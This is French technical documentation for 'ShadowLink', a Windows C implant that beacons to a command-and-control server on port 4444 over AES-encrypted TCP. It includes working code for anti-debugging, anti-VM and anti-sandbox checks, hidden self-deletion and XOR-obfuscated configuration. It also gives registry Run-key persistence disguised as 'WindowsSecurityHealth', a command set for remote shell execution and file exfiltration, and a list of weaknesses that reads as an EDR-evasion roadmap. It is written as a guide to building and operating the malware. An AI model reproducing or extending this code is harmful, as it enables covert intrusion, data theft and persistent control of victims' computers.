# 🖥️ ShadowLink Agent - Documentation Technique

## Vue d'ensemble

L'agent ShadowLink est un implant Windows écrit en C qui se connecte au serveur C2 et exécute des commandes à distance.

---

## 📋 Caractéristiques Techniques

| Propriété | Valeur |
|-----------|--------|
| Langage | C (C99) |
| Plateforme | Windows x64 |
| Taille | ~50-80 KB |
| Dépendances | ws2_32.dll, advapi32.dll, kernel32.dll |
| Chiffrement | AES-256-CBC |
| Protocole | TCP |

---

## 🏗️ Architecture du Code

```
agent.c
├── Configuration
│   ├── SERVER_IP (chiffré XOR)
│   ├── SERVER_PORT
│   └── Délais et timeouts
│
├── Évasion
│   ├── XOR String Encryption
│   ├── API Hashing (djb2)
│   ├── Anti-Debug
│   │   ├── IsDebuggerPresent
│   │   ├── CheckRemoteDebuggerPresent
│   │   └── Timing checks
│   ├── Anti-VM
│   │   ├── Nom d'ordinateur suspect
│   │   ├── Nom d'utilisateur suspect
│   │   ├── Ressources faibles
│   │   └── Processus VM/sandbox
│   ├── Anti-Sandbox
│   │   ├── Delayed execution
│   │   └── Fast execution detection
│   └── Self-deletion
│
├── Chiffrement
│   ├── aes_encrypt()
│   ├── aes_decrypt()
│   └── Génération IV
│
├── Réseau
│   ├── connect_to_server()
│   ├── Reconnexion automatique
│   └── Backoff exponentiel
│
├── Commandes
│   ├── Shell execution
│   ├── Reconnaissance
│   ├── Persistence
│   ├── Process management
│   └── File transfer
│
└── Main Loop
    ├── Evasion checks
    ├── Connection loop
    └── Command loop
```

---

## 🔧 Configuration

### Fichier `agent.h`

```c
// IP du serveur (chiffrée XOR avec clé 0x5A)
// Pour changer: chiffrer la nouvelle IP avec XOR 0x5A
static unsigned char encrypted_ip[] = {0x6b, 0x6c, 0x63, 0x7a, 0x6a, 0x7a, 0x6a, 0x7a, 0x6b, 0x00};

// Port du serveur
#define SERVER_PORT 4444

// Clé XOR pour le déchiffrement
#define XOR_KEY 0x5A

// Délai initial anti-sandbox (ms)
#define INITIAL_DELAY 10000
```

### Constantes importantes

```c
#define BUFFER_SIZE 4096           // Taille buffer général
#define RECON_BUFFER_SIZE 65536    // 64KB pour recon
#define FILE_CHUNK_SIZE 4096       // Chunks file transfer
#define RECONNECT_DELAY 5000       // Délai reconnexion initial
#define MAX_RECONNECT_DELAY 60000  // Délai max (60s)
```

---

## 📡 Protocole de Communication

### Connexion initiale

```
1. Agent résout l'IP (déchiffrement XOR)
2. Agent crée socket TCP
3. Agent connect() vers SERVER_IP:SERVER_PORT
4. Si échec: attendre RECONNECT_DELAY, retry avec backoff
```

### Échange de commandes

```
┌─────────┐                              ┌─────────┐
│  Server │                              │  Agent  │
└────┬────┘                              └────┬────┘
     │                                        │
     │  1. Encrypt(command) ─────────────────>│
     │                                        │
     │                                        │ 2. Decrypt
     │                                        │ 3. Execute
     │                                        │ 4. Encrypt(result)
     │                                        │
     │<───────────────────── Encrypt(result)  │
     │                                        │
     │  5. Decrypt                            │
     │  6. Display                            │
```

### Format des paquets

```
┌──────────────────────────────────────────────┐
│                  Packet                       │
├────────────────┬─────────────────────────────┤
│  IV (16 bytes) │  AES-CBC Encrypted Data     │
│                │  (PKCS7 padded)             │
└────────────────┴─────────────────────────────┘
```

---

## 🛡️ Techniques d'Évasion

### 1. XOR String Encryption

L'IP du serveur est stockée chiffrée pour éviter la détection statique:

```c
// "127.0.0.1" chiffré avec XOR 0x5A
static unsigned char encrypted_ip[] = {
    0x6b, 0x6c, 0x63, 0x7a, 
    0x6a, 0x7a, 0x6a, 0x7a, 
    0x6b, 0x00
};

// Déchiffrement au runtime
void xor_decrypt(char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}
```

### 2. API Hashing

Résolution dynamique des API par hash djb2:

```c
unsigned long djb2_hash(const char *str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Résolution par parcours de l'Export Directory
FARPROC resolve_api_by_hash(HMODULE module, unsigned long target_hash);
```

### 3. Anti-Debug

```c
int check_debugger_present() {
    // Méthode 1: API Windows
    if (IsDebuggerPresent()) return 1;
    
    // Méthode 2: Remote debugger
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
    if (debuggerPresent) return 1;
    
    return 0;
}

int check_timing_attack() {
    // Mesure du temps pour détecter les breakpoints
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    // Opération simple
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) x += i;
    
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000;
    
    // > 50ms = suspect
    return (elapsed > 50.0);
}
```

### 4. Anti-VM / Anti-Sandbox

```c
// Noms d'ordinateur suspects
const char *suspicious_pc_names[] = {
    "SANDBOX", "VIRUS", "MALWARE", "ANALYSIS", 
    "CUCKOO", "VBOX", "VMWARE", NULL
};

// Processus de VM/analyse
const char *vm_processes[] = {
    "vmtoolsd.exe", "vboxservice.exe",
    "procmon.exe", "wireshark.exe",
    "x64dbg.exe", "ida64.exe", NULL
};

// Vérification des ressources (VM = peu de RAM/CPU)
int check_low_resources() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    
    // < 2GB RAM = suspect
    if (memInfo.ullTotalPhys / (1024*1024*1024) < 2) return 1;
    
    // < 2 CPU = suspect
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return 1;
    
    return 0;
}
```

### 5. Delayed Execution

```c
int delayed_execution(DWORD delay_ms) {
    DWORD startTick = GetTickCount();
    Sleep(delay_ms);
    DWORD elapsed = GetTickCount() - startTick;
    
    // Si le temps est accéléré (sandbox), elapsed << delay_ms
    if (elapsed < delay_ms * 0.9) {
        return 1;  // Sandbox détectée
    }
    return 0;
}
```

### 6. Self-Deletion

```c
int self_delete(void) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // Commande batch pour supprimer après délai
    char cmdLine[MAX_PATH * 2];
    snprintf(cmdLine, sizeof(cmdLine),
        "cmd.exe /c ping 127.0.0.1 -n 3 > nul & del /f /q \"%s\"",
        exePath);
    
    // Exécuter en mode caché
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
```

---

## 📝 Commandes Disponibles

### Commandes de contrôle

| Commande | Description |
|----------|-------------|
| `help` | Affiche l'aide |
| `exit` | Déconnecte (l'agent se reconnecte) |
| `die` | Termine l'agent définitivement |
| `selfdestruct` | Supprime l'agent du disque et termine |

### Process Management

| Commande | Description |
|----------|-------------|
| `ps` | Liste tous les processus (PID, PPID, Nom) |
| `kill <pid>` | Tue un processus par son PID |

### File Transfer

| Commande | Description |
|----------|-------------|
| `download <path>` | Télécharge un fichier vers le serveur |
| `upload <path>` | Reçoit un fichier du serveur |

### Persistence

| Commande | Description |
|----------|-------------|
| `persist` | Installe la persistence (registre Run) |
| `unpersist` | Supprime la persistence |
| `checkpersist` | Vérifie si la persistence est active |

### Évasion

| Commande | Description |
|----------|-------------|
| `stealth on` | Active les vérifications d'évasion |
| `stealth off` | Désactive les vérifications |
| `checksec` | Exécute toutes les vérifications de sécurité |

### Reconnaissance

| Commande | Description |
|----------|-------------|
| `recon` | Rapport complet (sysinfo, whoami, ipconfig, netstat, etc.) |

### Shell

| Commande | Description |
|----------|-------------|
| `<any command>` | Exécute via `cmd.exe /c` |

---

## 🔄 Persistence

### Mécanisme

L'agent utilise la clé de registre `Run` pour persister:

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Valeur: WindowsSecurityHealth
Data: C:\path\to\agent.exe
```

### Code

```c
int install_persistence() {
    HKEY hKey;
    char exePath[MAX_PATH];
    
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    
    RegSetValueExA(hKey, "WindowsSecurityHealth", 0, REG_SZ,
        (BYTE*)exePath, strlen(exePath) + 1);
    
    RegCloseKey(hKey);
    return 0;
}
```

---

## 📂 File Transfer Protocol

### Download (Agent → Server)

```
1. Server envoie: "download <path>"
2. Agent ouvre le fichier
3. Agent envoie: "OK:<filesize>" (chiffré)
4. Server envoie: "ACK" (chiffré)
5. Agent envoie chunks:
   [4 bytes: chunk_size][chunk_size bytes: encrypted_data]
6. Agent envoie: [4 bytes: 0] (fin)
```

### Upload (Server → Agent)

```
1. Server envoie: "upload <path>"
2. Server envoie: "SIZE:<filesize>" (chiffré)
3. Agent répond: "READY" ou "ERROR:<msg>" (chiffré)
4. Server envoie chunks:
   [4 bytes: chunk_size][chunk_size bytes: encrypted_data]
5. Server envoie: [4 bytes: 0] (fin)
6. Agent répond: confirmation (chiffré)
```

---

## 🔌 Reconnexion Automatique

### Mécanisme

```c
int reconnect_delay = RECONNECT_DELAY;  // 5 secondes

while (1) {
    SOCKET sock = connect_to_server();
    
    if (sock == INVALID_SOCKET) {
        Sleep(reconnect_delay);
        
        // Backoff exponentiel
        reconnect_delay *= 2;
        if (reconnect_delay > MAX_RECONNECT_DELAY) {
            reconnect_delay = MAX_RECONNECT_DELAY;
        }
        continue;
    }
    
    // Connexion réussie, reset le délai
    reconnect_delay = RECONNECT_DELAY;
    
    command_loop(sock);
    
    closesocket(sock);
    Sleep(RECONNECT_DELAY);
}
```

### Séquence de délais

```
Tentative 1: 5s
Tentative 2: 10s
Tentative 3: 20s
Tentative 4: 40s
Tentative 5+: 60s (max)
```

---

## 🛠️ Compilation

### Flags de compilation

```bash
gcc -o agent.exe agent.c aes.c \
    -lws2_32 \      # Winsock
    -ladvapi32 \    # Registry API
    -DAES256=1      # Mode AES-256
```

### Options supplémentaires recommandées

```bash
-O2                 # Optimisation
-s                  # Strip symbols
-fno-stack-protector
-fomit-frame-pointer
```

---

## 📊 Flux d'Exécution

```
main()
│
├─► srand(time)
│
├─► [Stealth Mode?]
│   └─► delayed_execution(10s)
│       └─► [Sandbox?] → evasion_exit()
│
├─► perform_evasion_checks()
│   ├─► is_debugged()
│   └─► is_virtual_machine()
│       └─► [Detected?] → evasion_exit()
│
├─► WSAStartup()
│
└─► while(1) [Reconnection Loop]
    │
    ├─► perform_evasion_checks()
    │
    ├─► connect_to_server()
    │   └─► [Failed?] → Sleep(backoff) → continue
    │
    └─► command_loop(sock)
        │
        └─► while(1)
            │
            ├─► recv(command)
            ├─► aes_decrypt()
            │
            ├─► [exit?] → return (reconnect)
            ├─► [die?] → exit(0)
            ├─► [selfdestruct?] → self_delete() + exit(0)
            ├─► [ps?] → list_processes()
            ├─► [kill?] → kill_process()
            ├─► [download?] → send_file_to_server()
            ├─► [upload?] → receive_file_from_server()
            ├─► [persist?] → install_persistence()
            ├─► [recon?] → do_recon()
            ├─► [checksec?] → security_checks()
            └─► [other?] → execute_command()
                │
                └─► aes_encrypt(result)
                    └─► send()
```

---

## ⚠️ Limitations Connues

1. **Clé AES hardcodée** - Doit être changée pour chaque déploiement
2. **Pas de vérification de certificat** - TCP brut, pas TLS
3. **Port 4444** - Port connu, facilement filtré
4. **Strings partiellement chiffrées** - Certaines restent en clair
5. **Pas de syscalls directs** - APIs hookables par EDR
6. **Pas d'injection de processus** - Exécution dans son propre processus
